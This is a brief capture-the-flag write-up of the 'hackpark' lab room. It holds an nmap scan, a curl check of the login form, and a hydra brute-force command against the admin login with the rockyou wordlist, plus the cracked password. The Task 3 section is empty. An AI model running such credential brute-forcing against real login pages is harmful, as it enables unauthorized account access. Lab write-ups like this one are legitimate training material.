# hackpark THM

>Nathaniel Mickel | 13 Sept, 2021

```bash
export IP=10.10.98.247
```

# Nmap 7.91 scan initiated Mon Sep 13 08:28:38 2021 as: nmap -sV -sC -oN nmap/initial 10.10.98.247
Nmap scan report for 10.10.98.247
Host is up (0.17s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2021-09-13T13:30:17+00:00
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-09-12T13:24:01
|_Not valid after:  2022-03-14T13:24:01
|_ssl-date: 2021-09-13T13:30:19+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# Task 1
```
curl -s http://10.10.98.247/Account/login.aspx?ReturnURL=/admin/ | grep "form method" 
```
# Task 2
```
hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.98.247 http-post-form "/Account/login.aspx?ReturnURL=/admin /:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" 
[80][http-post-form] host: 10.10.79.198   login: admin   password: 1qaz2wsx
```

# Task 3
